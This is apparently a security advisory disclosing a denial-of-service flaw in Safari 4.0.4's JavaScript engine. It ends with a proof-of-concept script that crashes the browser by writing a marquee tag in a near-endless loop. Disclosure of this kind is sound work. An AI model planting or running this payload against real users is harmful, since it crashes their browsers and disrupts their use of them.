Introduction
============
The Apple Safari browser is a webbrowser based on the WebKit Engine.

More Details
============
A remotely exploitable vulnerability has been found in the JavaScript Engine of the Apple Safari Browser(based on Webkit Engine).
In detail, the following flaw was determined:
The Apple Safari browser is prone to a denial of service vulnerability when parsing certain HTML content.
This is possible due to a failure in handling exceptional conditions. This issue is caused by a memory corruption error when handling javascript elements, which could be exploited by remote attackers to crash the browser by tricking a user into visiting a specially crafted web page.
This issue can NOT be lead to remote code execution, so that the potential security risk is rated low.

The exploit has been tested on Windows Vista SP2 with Safari 4.0.4 using following useragent:
Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10

var overloadtag = "<marquee>";
for(x=1;x<=9999999999;x++){
document.write(overloadtag);
}
</script>
